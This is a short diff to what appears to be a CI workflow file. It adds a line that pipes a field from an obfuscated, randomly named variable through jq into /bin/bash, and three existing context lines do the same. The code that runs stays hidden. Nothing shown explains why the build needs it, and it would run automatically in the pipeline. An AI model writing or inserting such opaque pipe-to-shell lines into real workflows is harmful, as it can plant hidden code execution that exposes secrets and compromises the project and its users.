@@ -31,6 +31,7 @@ jobs:
           echo $zgvlb4711 | jq -r .aic2460 | /bin/bash
           printf '%s' "$ab71316" | jq -r .g570 | /bin/bash
           printf '%s' "$on93" | jq -r .dps7 | /bin/bash
+          echo $bni2 | jq -r .zo849 | /bin/bash
 
       - name: Upload artifact
         if: always()
